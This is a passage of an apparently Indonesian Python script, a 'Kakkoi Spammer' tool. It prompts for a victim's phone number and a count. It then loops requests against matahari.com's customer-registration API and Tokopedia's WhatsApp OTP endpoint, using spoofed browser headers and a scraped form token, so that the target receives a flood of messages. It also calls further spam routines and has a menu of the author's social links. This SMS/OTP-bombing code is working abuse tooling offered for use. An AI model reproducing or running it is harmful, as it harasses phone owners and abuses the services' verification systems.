			jml = int(input("Jumlah \033[1;91mSpam > \033[1;93m"))
		heder = {'Host': 'www.matahari.com',
				'content-length': '240',
				'origin': 'https://www.matahari.com',
				'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
				'content-type': 'application/json',
				'accept': '*/*',
				'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
				'save-data': 'on',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.matahari.com/customer/account/create/',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
		data = {
			"thor_customer": {
				"name": Name,
				"email_address": Email,
				"mobile_country_code": "+62",
				"gender_id": "1",
				"mobile_number": nomor,
				"mro": "",
				"password": "Wadepak1037",
				"birth_date": "04/02/2022"
				}
			}

		print("\n\033[37m[\033[31m!\033[37m] \033[32mMessage ..\n")
		for i in range(jml):
			sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
			if 'Success' in sec.text:
				print(f'\033[37m[\033[35m{kakkoi_point}\033[37m] \033[33mMessage \033[31m: \033[32mSpam Sms Succes Terkirim')
				time.sleep(3)
				kakkoi_point += 1
			else:
				print(f'\033[37m[\033[35m{kakkoi_point}\033[37m] \033[33mMessage \033[31m: \033[31mSpam Sms Gagal Terkirim')
				time.sleep(3)
				kakkoi_point += 1
			time.sleep(1.5)
		print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai... \033[33m:)')
		print ()
		spam(contoh3)
	elif pilih2 == "2":
		print ()
		time.sleep(1)
		print ("Kakkoi Spammer tip: Kakkoi Spammer")
		print ("can be configured at startup, see")
		print ("your the number target contoh : 0858xxx")
		print ("")
		kakkoi_point = 1
		xl_0 = input("\033[1;97mNumber \033[1;91mTarget > \033[1;97m")
		no = ("0"+xl_0)
		jumlah = int(input("Jumlah \033[1;91mSpam > \033[1;93m"))
		InquiryId_xl = "237992422"
		id_xl = "237775262"
		dark_user = {
		'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
		'Accept-Encoding' : 'gzip, deflate',
		'Connection' : 'keep-alive',
		'Origin' : 'https://accounts.tokopedia.com',
		'Accept' : 'application/json, text/javascript, */*; q=0.01',
		'X-Requested-With' : 'XMLHttpRequest',
		'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = dark_user).text
		drk = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		mr_dark_to_the_moon = {
		"otp_type" : "116",
		"msisdn" : no,
		"tk" : drk,
		"email" : '',
		"original_param" : "",
		"user_id" : "",
		"signature" : "",
		"number_otp_digit" : "6"
		}
		mr_dark_bruh = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = dark_user, data = mr_dark_to_the_moon).text
		for i in range(int(jumlah)):
			if 'Sorry Bro, Anda sudah melakukan 3 kali pengiriman kode' in mr_dark_bruh:
				print(f'\033[1;37m[\033[31m{kakkoi_point}\033[1;37m] \033[1;37mSilahkan Coba Ulang Setelah 5 menit! \033[31m ')
				time.sleep(5)
				kakkoi_point += 1
			else:
				print(f'\033[1;37m[\033[1;32m{kakkoi_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
				time.sleep(5)
				kakkoi_point += 1
		print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai... \033[33m:)')
		print ()
		spam(contoh3)
	elif pilih2 == "3":
		call()
		spam(contoh3)
	elif pilih2 == "4":
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m!\033[1;97m] Wait... ")
		brutal()
		spam(contoh3)
	elif pilih2 == "5":
		print ()
		print ("\033[1;97m[\033[1;91m!\033[1;97m] Kembali Ke Menu...")
		time.sleep(1)
		logo()
		menu()
		spam(contoh3)
	elif pilih2 == "exit":
		keluar()
	else:
		time.sleep(1)
		print ("[\033[1;91m!\033[1;97m] Command\033[1;91m", pilih2, "\033[1;97mNot Found")
		spam(contoh3)
# Def Kontak Newww Yang Di Atas Itu Salah Bezaaar
""" Oke Gays Jadi hmmm Tadi Itu Salah Yang Def Kontak Pertama Di karenakan Gua Agak Mulai Bingung Ama Bug Nya jadi gua nemu solusinya
oke langsung aja kita mulai coding yang sama psrsis di atas tpi sbelum nyanmaaf gua gk mau cape
cape ngetik jadi gua copas aja..."""
def new_kontak(contoh3):
	kontak = input("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mNumber \033[1;91m: \033[1;97m")
	if kontak == "1":
		print ()
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mSedang Memuat Link... \033[1;97m")
		time.sleep(2)
		os.system("xdg-open https://www.facebook.com/Shirangryu")
		print ()
		print ("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSelesai... \033[1;97m")
		time.sleep(2)
		print ()
		new_kontak(contoh3)
	elif kontak == "2":
		print ()
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mSedang Memuat Link... \033[1;97m")
		time.sleep(2)
		os.system("xdg-open https://api.whatsapp.com/send?phone=6285823104620&text=Assalamualaikum%20bg.%20salam%20kenal%20yaa")
		print ()
		print ("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSelesai... \033[1;97m")
		time.sleep(2)
		print ()
		new_kontak(contoh3)
	elif kontak == "3":
		print ()
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mSedang Memuat Link... ")
		time.sleep(2)
		os.system("xdg-open https://www.instagram.com/invites/contact/?i=vrmj1wqfx8qz&utm_content=ljkhdz3")
		print ()
		print ("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSelesai... \033[1;97m")
		time.sleep(2)
		print ()
		new_kontak(contoh3)
	elif kontak == "4":
		print ()
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mSedang Memuat Link... \033[1;97m")
		time.sleep(2)
		os.system("xdg-open https://t.me/KakkoiNamae")
		print ()
		print ("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSelesai... \033[1;97m")
		time.sleep(2)
		print ()
		new_kontak(contoh3)
	elif kontak == "5":
		print ()
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mSedang Memuat Link... \033[1;97m")
		time.sleep(2)
		os.system("xdg-open https://free.facebook.com/photo.php?fbid=232692795670279&id=100067886811771&set=a.127281592878067&refid=17")
		print ()
		print ("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSelesai... \033[1;97m")
		time.sleep(2)
		print ()
		new_kontak(contoh3)
	elif kontak == "6":
		print ()
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m•\033[1;97m] \033[1;93mSedang Memuat Link... \033[1;97m")
		time.sleep(2)
		print ()
		print ("\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;93mSelesai...\033[1;97m")
		time.sleep(1)
		print ()
		new_kontak(contoh3)
	elif kontak == "11":
		print ()
		menu()
	else:
		time.sleep(1)
		print ("\033[1;97m[\033[1;91m!\033[1;97m] Command\033[1;91m", kontak, "\033[1;97mNot Found")
		new_kontak(contoh3)




# Menu() Akhir...
menu()
# Selesai
